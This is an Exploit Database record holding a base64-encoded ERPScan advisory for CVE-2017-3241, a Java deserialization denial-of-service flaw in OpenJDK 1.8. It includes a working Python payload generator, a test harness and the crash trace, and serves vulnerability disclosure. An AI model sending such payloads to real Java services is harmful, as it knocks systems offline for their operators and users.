{
    "source": "exploit-database", 
    "exploit": "JycnDQpBcHBsaWNhdGlvbjogSmF2YSBTRQ0KDQpWZW5kb3I6IE9yYWNsZQ0KDQpCdWc6IERvUw0KDQpSZXBvcnRlZDogMjMuMTIuMjAxNg0KDQpWZW5kb3IgcmVzcG9uc2U6IDI0LjEyLjIwMTYNCg0KRGF0ZSBvZiBQdWJsaWMgQWR2aXNvcnk6IDE3LjAxLjIwMTcNCg0KUmVmZXJlbmNlOiBPcmFjbGUgQ1BVIEphbiAyMDE3DQoNCkF1dGhvcjogUm9tYW4gU2hhbHltb3YNCg0KDQoNCjEuIEFEVklTT1JZIElORk9STUFUSU9ODQoNClRpdGxlOiBPcmFjbGUgT3BlbkpESyAtIEphdmEgU2VyaWFsaXphdGlvbiBEb1MNCg0KQWR2aXNvcnkgSUQ6IFtFUlBTQ0FOLTE3LTAwNl0NCg0KUmlzazogSGlnaA0KDQpBZHZpc29yeSBVUkw6DQpodHRwczovL2VycHNjYW4uY29tL2Fkdmlzb3JpZXMvZXJwc2Nhbi0xNy0wMDYtb3JhY2xlLW9wZW5qZGstamF2YS1zZXJpYWxpemF0aW9uLWRvcy12dWxuZXJhYmlsaXR5Lw0KDQpEYXRlIHB1Ymxpc2hlZDogMTcuMDEuMjAxNw0KDQpWZW5kb3IgY29udGFjdGVkOiBPcmFjbGUNCg0KDQoyLiBWVUxORVJBQklMSVRZIElORk9STUFUSU9ODQoNCg0KQ2xhc3M6IERlbmlhbCBvZiBTZXJ2aWNlDQoNClJlbW90ZWx5IEV4cGxvaXRhYmxlOiBZZXMNCg0KTG9jYWxseSBFeHBsb2l0YWJsZTogWWVzDQoNCkNWRSBOYW1lOiBDVkUtMjAxNy0zMjQxDQoNCkNWU1MgQmFzZSBTY29yZTogOS4wDQoNCg0KMy4gVlVMTkVSQUJJTElUWSBERVNDUklQVElPTg0KDQoNCkFuIGF0dGFja2VyIGNhbiBjYXVzZSBEb1Mgb2YgdGhlIGFwcGxpY2F0aW9uIHdoaWNoIHVzZXMgT3BlbkpESyBSdW50aW1lDQpFbnZpcm9ubWVudCAxLjggYXMgaXRzIGNvcmUgcnVudGltZSBlbmdpbmUuDQoNCg0KNC4gVlVMTkVSQUJMRSBQQUNLQUdFUw0KDQoNCk9wZW5KREsgUnVudGltZSBFbnZpcm9ubWVudCBidWlsZCAxLjguMF8xMTItYjE1DQoNCg0KNS4gU09MVVRJT05TIEFORCBXT1JLQVJPVU5EUw0KDQoNCkZpeCBPYmplY3RJbnB1dFN0cmVhbS5za2lwQ3VzdG9tRGF0YSgpIG1ldGhvZCwgbmFtZWx5IHJlYWRPYmplY3QwKGZhbHNlKTsNCmNhbGwgaW4gc3dpdGNoIHN0YXRlbWVudA0KDQpBZHJlc3MgT3JhY2xlIENQVSBKYW51YXJ5IDIwMTcNCg0KIDYuIEFVVEhPUg0KDQoNClJvbWFuIFNoYWx5bW92IChAc2hhbHltb3YpDQoNCg0KNy4gVEVDSE5JQ0FMIERFU0NSSVBUSU9ODQoNCg0KQW4gYXR0YWNrZXIgY2FuIGNyYWZ0IGEgbWFsaWNpb3VzIHNlcXVlbmNlIG9mIGJ5dGVzIHRoYXQgd2lsbCBjYXVzZSBKVk0NClN0YWNrT3ZlcmZsb3dFcnJvciBpbiB0aGUgc3RhbmRhcmQgSmF2YSBkZXNlcmlhbGl6YXRpb24gcHJvY2VzcyBpZiBpdCB1c2VzDQpPYmplY3RJbnB1dFN0cmVhbS5yZWFkT2JqZWN0KCkgbWV0aG9kLg0KDQoNCjcuMS4gUHJvb2Ygb2YgQ29uY2VwdA0KDQpBbiBhdHRhY2tlciBjcmVhdGVzIGEgbWFsaWNpb3VzIHNlcXVlbmNlIG9mIGJ5dGVzLCBmb3IgZXhhbXBsZSwgdXNpbmcgdGhpcw0KcHl0aG9uIHNjcmlwdCBwd25fc2VyLnB5Og0KDQonJycNCiMhL3Vzci9iaW4vZW52IHB5dGhvbjINCg0KaW1wb3J0IHN5cw0KDQpleHAgPSAiIg0KDQojc2VyaWFsaXphdGlvbiBoZWFkZXINCg0KZXhwICs9ICdceGFjXHhlZFx4MDBceDA1Jw0KDQpleHAxID0gJycNCg0KZXhwMSArPSAnXHg3MicNCg0KZXhwMSArPSAnXHgwMFx4MGMnKydqYXZhLmlvLkZpbGUnDQoNCmV4cDEgKz0gJ1x4NDEnKjgNCg0KZXhwMSArPSAnXHgwMCcNCg0KZXhwMSArPSAnXHgwMFx4MDAnDQoNCg0KZXhwICs9IGV4cDEgKiAxMDAwMA0KDQpzeXMuc3Rkb3V0LndyaXRlKGV4cCkNCg0KJycnDQphbmQgc2F2ZSBpdCBpbiBleHAyLnNlciBmaWxlDQoNCg0KJCAuL3B3bl9zZXIyLnB5ID4gZXhwMi5zZXINCg0KTGV0J3Mgc2ltdWxhdGUgZGVzZXJpYWxpemF0aW9uIHByb2Nlc3MuIEZvciB0aGlzIHB1cnBvc2UsIHdlIGNyZWF0ZSBhDQpzaW1wbGUgSmF2YSBwcm9ncmFtLCB3aGljaCB1c2VzIHRoZSBmb2xsb3dpbmcgc3RhbmRhcmQgZGVzZXJpYWxpemF0aW9uDQpwYXR0ZXJuOg0KDQoNClNlcmlhbGl6ZV9yZWFkLmphdmENCg0KDQppbXBvcnQgamF2YS5pby5GaWxlSW5wdXRTdHJlYW07DQoNCmltcG9ydCBqYXZhLmlvLk9iamVjdElucHV0U3RyZWFtOw0KDQpwdWJsaWMgY2xhc3MgU2VyaWFsaXplX3JlYWQgew0KDQpwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmcgYXJnc1tdKSB0aHJvd3MgRXhjZXB0aW9uIHsNCg0KICBpZihhcmdzLmxlbmd0aCA8IDEpIHsNCg0KICAgICAgU3lzdGVtLm91dC5wcmludGxuKCJ1c2FnZTogIitTZXJpYWxpemVfcmVhZC5jbGFzcy5nZXRTaW1wbGVOYW1lKCkrIg0KW2ZpbGVdIik7DQoNCiAgICAgIFN5c3RlbS5leGl0KC0xKTsNCg0KICB9DQoNCiAgRmlsZUlucHV0U3RyZWFtIGZpbiA9IG5ldyBGaWxlSW5wdXRTdHJlYW0oYXJnc1swXSk7DQoNCiAgT2JqZWN0SW5wdXRTdHJlYW0gb2luID0gbmV3IE9iamVjdElucHV0U3RyZWFtKGZpbik7DQoNCiAgdHJ5IHsNCg0KICAgIE9iamVjdCBvYmpGcm9tRGlzayA9IG9pbi5yZWFkT2JqZWN0KCk7DQoNCiAgICBTdHJpbmcgcyA9IChTdHJpbmcpb2JqRnJvbURpc2s7DQoNCiAgICBTeXN0ZW0ub3V0LnByaW50bG4ocyk7DQoNCiAgICBTeXN0ZW0ub3V0LnByaW50bG4oIlN1Y2Nlc3NmdWxseSByZWFkISIpOw0KDQogIH1jYXRjaChFeGNlcHRpb24gZSl7fQ0KDQogIFN5c3RlbS5leGl0KDApOw0KDQp9DQoNCn0NCg0KDQpMZXQncyB0cnkgdG8gcmVhZCBvdXIgbWFsaWNpb3VzIGZpbGUgKHdlIGNhbiBhbHNvIHNpbXVsYXRlIHRoaXMgc3R1ZmYgb3Zlcg0KbmV0d29yayBjb21tdW5pY2F0aW9uKToNCg0KJCBqYXZhYyBTZXJpYWxpemVfcmVhZC5qYXZhDQoNCiQgamF2YSBTZXJpYWxpemVfcmVhZCBleHAyLnNlcg0KDQpJdCBjYXVzZXMgdGhlIGZvbGxvd2luZyBlcnJvciBkdW1wOg0KDQpFeGNlcHRpb24gaW4gdGhyZWFkICJtYWluIiBqYXZhLmxhbmcuU3RhY2tPdmVyZmxvd0Vycm9yDQoNCmF0DQpqYXZhLmlvLk9iamVjdElucHV0U3RyZWFtJFBlZWtJbnB1dFN0cmVhbS5yZWFkRnVsbHkoT2JqZWN0SW5wdXRTdHJlYW0uamF2YToyMzUxKQ0KDQphdA0KamF2YS5pby5PYmplY3RJbnB1dFN0cmVhbSRCbG9ja0RhdGFJbnB1dFN0cmVhbS5yZWFkVW5zaWduZWRTaG9ydChPYmplY3RJbnB1dFN0cmVhbS5qYXZhOjI4MzQpDQoNCmF0DQpqYXZhLmlvLk9iamVjdElucHV0U3RyZWFtJEJsb2NrRGF0YUlucHV0U3RyZWFtLnJlYWRVVEYoT2JqZWN0SW5wdXRTdHJlYW0uamF2YToyODkyKQ0KDQphdCBqYXZhLmlvLk9iamVjdElucHV0U3RyZWFtLnJlYWRVVEYoT2JqZWN0SW5wdXRTdHJlYW0uamF2YToxMDc1KQ0KDQphdCBqYXZhLmlvLk9iamVjdFN0cmVhbUNsYXNzLnJlYWROb25Qcm94eShPYmplY3RTdHJlYW1DbGFzcy5qYXZhOjY4NCkNCg0KYXQgamF2YS5pby5PYmplY3RJbnB1dFN0cmVhbS5yZWFkQ2xhc3NEZXNjcmlwdG9yKE9iamVjdElucHV0U3RyZWFtLmphdmE6ODMzKQ0KDQphdCBqYXZhLmlvLk9iamVjdElucHV0U3RyZWFtLnJlYWROb25Qcm94eURlc2MoT2JqZWN0SW5wdXRTdHJlYW0uamF2YToxNjA5KQ0KDQphdCBqYXZhLmlvLk9iamVjdElucHV0U3RyZWFtLnJlYWRDbGFzc0Rlc2MoT2JqZWN0SW5wdXRTdHJlYW0uamF2YToxNTIxKQ0KDQphdCBqYXZhLmlvLk9iamVjdElucHV0U3RyZWFtLnJlYWRPYmplY3QwKE9iamVjdElucHV0U3RyZWFtLmphdmE6MTM0MCkNCg0KYXQgamF2YS5pby5PYmplY3RJbnB1dFN0cmVhbS5za2lwQ3VzdG9tRGF0YShPYmplY3RJbnB1dFN0cmVhbS5qYXZhOjE5ODQpDQoNCmF0IGphdmEuaW8uT2JqZWN0SW5wdXRTdHJlYW0ucmVhZE5vblByb3h5RGVzYyhPYmplY3RJbnB1dFN0cmVhbS5qYXZhOjE2MjgpDQoNCmF0IGphdmEuaW8uT2JqZWN0SW5wdXRTdHJlYW0ucmVhZENsYXNzRGVzYyhPYmplY3RJbnB1dFN0cmVhbS5qYXZhOjE1MjEpDQoNCmF0IGphdmEuaW8uT2JqZWN0SW5wdXRTdHJlYW0ucmVhZE9iamVjdDAoT2JqZWN0SW5wdXRTdHJlYW0uamF2YToxMzQwKQ0KDQouLi4NCg0KYXQgamF2YS5pby5PYmplY3RJbnB1dFN0cmVhbS5za2lwQ3VzdG9tRGF0YShPYmplY3RJbnB1dFN0cmVhbS5qYXZhOjE5ODQpDQoNCmF0IGphdmEuaW8uT2JqZWN0SW5wdXRTdHJlYW0ucmVhZE5vblByb3h5RGVzYyhPYmplY3RJbnB1dFN0cmVhbS5qYXZhOjE2MjgpDQoNCmF0IGphdmEuaW8uT2JqZWN0SW5wdXRTdHJlYW0ucmVhZENsYXNzRGVzYyhPYmplY3RJbnB1dFN0cmVhbS5qYXZhOjE1MjEpDQoNCmF0IGphdmEuaW8uT2JqZWN0SW5wdXRTdHJlYW0ucmVhZE9iamVjdDAoT2JqZWN0SW5wdXRTdHJlYW0uamF2YToxMzQwKQ0KDQphdCBqYXZhLmlvLk9iamVjdElucHV0U3RyZWFtLnNraXBDdXN0b21EYXRhKE9iamVjdElucHV0U3RyZWFtLmphdmE6MTk4NCkNCg0KYXQgamF2YS5pby5PYmplY3RJbnB1dFN0cmVhbS5yZWFkTm9uUHJveHlEZXNjKE9iamVjdElucHV0U3RyZWFtLmphdmE6MTYyOCkNCg0KYXQgamF2YS5pby5PYmplY3RJbnB1dFN0cmVhbS5yZWFkQ2xhc3NEZXNjKE9iamVjdElucHV0U3RyZWFtLmphdmE6MTUyMSkNCg0KYXQgamF2YS5pby5PYmplY3RJbnB1dFN0cmVhbS5yZWFkT2JqZWN0MChPYmplY3RJbnB1dFN0cmVhbS5qYXZhOjEzNDApDQoNCmF0IGphdmEuaW8uT2JqZWN0SW5wdXRTdHJlYW0uc2tpcEN1c3RvbURhdGEoT2JqZWN0SW5wdXRTdHJlYW0uamF2YToxOTg0KQ0KDQphdCBqYXZhLmlvLk9iamVjdElucHV0U3RyZWFtLnJlYWROb25Qcm94eURlc2MoT2JqZWN0SW5wdXRTdHJlYW0uamF2YToxNjI4KQ0KDQphdCBqYXZhLmlvLk9iamVjdElucHV0U3RyZWFtLnJlYWRDbGFzc0Rlc2MoT2JqZWN0SW5wdXRTdHJlYW0uamF2YToxNTIxKQ0KDQoNCjguIFJFUE9SVCBUSU1FTElORQ0KDQpSZXBvcnRlZDogMjMuMTIuMjAxNg0KDQpWZW5kb3IgcmVzcG9uc2U6IDI0LjEyLjIwMTYNCg0KRGF0ZSBvZiBQdWJsaWMgQWR2aXNvcnk6IDE3LjAxLjIwMTcNCg0KOS4gUkVGRVJFTkNFUw0KaHR0cDovL3d3dy5vcmFjbGUuY29tL3RlY2huZXR3b3JrL3NlY3VyaXR5LWFkdmlzb3J5L2NwdWphbjIwMTctMjg4MTcyNy5odG1sDQpodHRwczovL2VycHNjYW4uY29tL2Fkdmlzb3JpZXMvZXJwc2Nhbi0xNy0wMDYtb3JhY2xlLW9wZW5qZGstamF2YS1zZXJpYWxpemF0aW9uLWRvcy12dWxuZXJhYmlsaXR5Lw0KDQoNCjEwLiBBQk9VVCBFUlBTY2FuIFJlc2VhcmNoDQoNCkVSUFNjYW4gcmVzZWFyY2ggdGVhbSBzcGVjaWFsaXplcyBpbiB2dWxuZXJhYmlsaXR5IHJlc2VhcmNoIGFuZCBhbmFseXNpcyBvZg0KY3JpdGljYWwgZW50ZXJwcmlzZSBhcHBsaWNhdGlvbnMuIEl0IHdhcyBhY2tub3dsZWRnZWQgbXVsdGlwbGUgdGltZXMgYnkgdGhlDQpsYXJnZXN0IHNvZnR3YXJlIHZlbmRvcnMgbGlrZSBTQVAsIE9yYWNsZSwgTWljcm9zb2Z0LCBJQk0sIFZNd2FyZSwgSFAgZm9yDQpkaXNjb3ZlcmluZyBtb3JlIHRoYW4gNDAwIHZ1bG5lcmFiaWxpdGllcyBpbiB0aGVpciBzb2x1dGlvbnMgKDIwMCBvZiB0aGVtDQpqdXN0IGluIFNBUCEpLg0KDQpFUlBTY2FuIHJlc2VhcmNoZXJzIGFyZSBwcm91ZCBvZiBkaXNjb3ZlcmluZyBuZXcgdHlwZXMgb2YgdnVsbmVyYWJpbGl0aWVzDQooVE9QIDEwIFdlYiBIYWNraW5nIFRlY2huaXF1ZXMgMjAxMikgYW5kIG9mIHRoZSAiVGhlIEJlc3QgU2VydmVyLVNpZGUgQnVnIg0Kbm9taW5hdGlvbiBhdCBCbGFja0hhdCAyMDEzLg0KDQpFUlBTY2FuIGV4cGVydHMgcGFydGljaXBhdGVkIGFzIHNwZWFrZXJzLCBwcmVzZW50ZXJzLCBhbmQgdHJhaW5lcnMgYXQgNjArDQpwcmltZSBpbnRlcm5hdGlvbmFsIHNlY3VyaXR5IGNvbmZlcmVuY2VzIGluIDI1KyBjb3VudHJpZXMgYWNyb3NzIHRoZQ0KY29udGluZW50cyAoIGUuZy4gQmxhY2tIYXQsIFJTQSwgSElUQikgYW5kIGNvbmR1Y3RlZCBwcml2YXRlIHRyYWluaW5ncyBmb3INCnNldmVyYWwgRm9ydHVuZSAyMDAwIGNvbXBhbmllcy4NCg0KRVJQU2NhbiByZXNlYXJjaGVycyBjYXJyeSBvdXQgdGhlIEVBUy1TRUMgcHJvamVjdCB0aGF0IGlzIGZvY3VzZWQgb24NCmVudGVycHJpc2UgYXBwbGljYXRpb24gc2VjdXJpdHkgYXdhcmVuZXNzIGJ5IGlzc3VpbmcgYW5udWFsIFNBUCBzZWN1cml0eQ0KcmVzZWFyY2hlcy4NCg0KRVJQU2NhbiBleHBlcnRzIHdlcmUgaW50ZXJ2aWV3ZWQgaW4gc3BlY2lhbGl6ZWQgaW5mby1zZWMgcmVzb3VyY2VzIGFuZA0KZmVhdHVyZWQgaW4gbWFqb3IgbWVkaWEgd29ybGR3aWRlLiBBbW9uZyB0aGVtIHRoZXJlIGFyZSBSZXV0ZXJzLCBZYWhvbywgU0MNCk1hZ2F6aW5lLCBUaGUgUmVnaXN0ZXIsIENJTywgUEMgV29ybGQsIERhcmtSZWFkaW5nLCBIZWlzZSwgQ2hpbmFieXRlLCBldGMuDQoNCk91ciB0ZWFtIGNvbnNpc3RzIG9mIGhpZ2hseS1xdWFsaWZpZWQgcmVzZWFyY2hlcnMsIHNwZWNpYWxpemVkIGluIHZhcmlvdXMNCmZpZWxkcyBvZiBjeWJlcnNlY3VyaXR5IChmcm9tIHdlYiBhcHBsaWNhdGlvbiB0byBJQ1MvU0NBREEgc3lzdGVtcyksDQpnYXRoZXJpbmcgdGhlaXIgZXhwZXJpZW5jZSB0byBjb25kdWN0IHRoZSBiZXN0IFNBUCBzZWN1cml0eSByZXNlYXJjaC4NCg0KMTEuIEFCT1VUIEVSUFNjYW4NCg0KRVJQU2NhbiBpcyB0aGUgbW9zdCByZXNwZWN0ZWQgYW5kIGNyZWRpYmxlIEJ1c2luZXNzIEFwcGxpY2F0aW9uDQpDeWJlcnNlY3VyaXR5IHByb3ZpZGVyLiBGb3VuZGVkIGluIDIwMTAsIHRoZSBjb21wYW55IG9wZXJhdGVzIGdsb2JhbGx5IGFuZA0KZW5hYmxlcyBsYXJnZSBPaWwgYW5kIEdhcywgRmluYW5jaWFsLCBSZXRhaWwgYW5kIG90aGVyIG9yZ2FuaXphdGlvbnMgdG8NCnNlY3VyZSB0aGVpciBtaXNzaW9uLWNyaXRpY2FsIHByb2Nlc3Nlcy4gTmFtZWQgYXMgYW4gYUVtZXJnaW5nIFZlbmRvcmEgaW4NClNlY3VyaXR5IGJ5IENSTiwgbGlzdGVkIGFtb25nIGFUT1AgMTAwIFNBUCBTb2x1dGlvbiBwcm92aWRlcnNhIGFuZA0KZGlzdGluZ3Vpc2hlZCBieSAzMCsgb3RoZXIgYXdhcmRzLCBFUlBTY2FuIGlzIHRoZSBsZWFkaW5nIFNBUCBTRSBwYXJ0bmVyIGluDQpkaXNjb3ZlcmluZyBhbmQgcmVzb2x2aW5nIHNlY3VyaXR5IHZ1bG5lcmFiaWxpdGllcy4gRVJQU2NhbiBjb25zdWx0YW50cw0Kd29yayB3aXRoIFNBUCBTRSBpbiBXYWxsZG9yZiB0byBhc3Npc3QgaW4gaW1wcm92aW5nIHRoZSBzZWN1cml0eSBvZiB0aGVpcg0KbGF0ZXN0IHNvbHV0aW9ucy4NCg0KRVJQU2NhbmFzIHByaW1hcnkgbWlzc2lvbiBpcyB0byBjbG9zZSB0aGUgZ2FwIGJldHdlZW4gdGVjaG5pY2FsIGFuZA0KYnVzaW5lc3Mgc2VjdXJpdHksIGFuZCBwcm92aWRlIHNvbHV0aW9ucyBmb3IgQ0lTTydzIHRvIGV2YWx1YXRlIGFuZCBzZWN1cmUNClNBUCBhbmQgT3JhY2xlIEVSUCBzeXN0ZW1zIGFuZCBidXNpbmVzcy1jcml0aWNhbCBhcHBsaWNhdGlvbnMgZnJvbSBib3RoDQpjeWJlcmF0dGFja3MgYW5kIGludGVybmFsIGZyYXVkLiBBcyBhIHJ1bGUsIG91ciBjbGllbnRzIGFyZSBsYXJnZQ0KZW50ZXJwcmlzZXMsIEZvcnR1bmUgMjAwMCBjb21wYW5pZXMgYW5kIE1TUHMsIHdob3NlIHJlcXVpcmVtZW50cyBhcmUgdG8NCmFjdGl2ZWx5IG1vbml0b3IgYW5kIG1hbmFnZSBzZWN1cml0eSBvZiB2YXN0IFNBUCBhbmQgT3JhY2xlIGxhbmRzY2FwZXMgb24gYQ0KZ2xvYmFsIHNjYWxlLg0KDQpXZSBhZm9sbG93IHRoZSBzdW5hIGFuZCBoYXZlIHR3byBodWJzLCBsb2NhdGVkIGluIFBhbG8gQWx0byBhbmQgQW1zdGVyZGFtLA0KdG8gcHJvdmlkZSB0aHJlYXQgaW50ZWxsaWdlbmNlIHNlcnZpY2VzLCBjb250aW51b3VzIHN1cHBvcnQgYW5kIHRvIG9wZXJhdGUNCmxvY2FsIG9mZmljZXMgYW5kIHBhcnRuZXIgbmV0d29yayBzcGFubmluZyAyMCsgY291bnRyaWVzIGFyb3VuZCB0aGUgZ2xvYmUuDQoNCg0KQWRyZXNzIFVTQTogMjI4IEhhbWlsdG9uIEF2ZW51ZSwgRmwuIDMsIFBhbG8gQWx0bywgQ0EuIDk0MzAxDQoNClBob25lOiA2NTAuNzk4LjUyNTUNCg0KVHdpdHRlcjogQGVycHNjYW4NCg0KU2Nvb3AtaXQ6IEJ1c2luZXNzIEFwcGxpY2F0aW9uIFNlY3VyaXR5DQonJyc=", 
    "filename": "platforms/multiple/dos/41145.py", 
    "id": "41145", 
    "cves": [
        "CVE-2017-3241"
    ]
}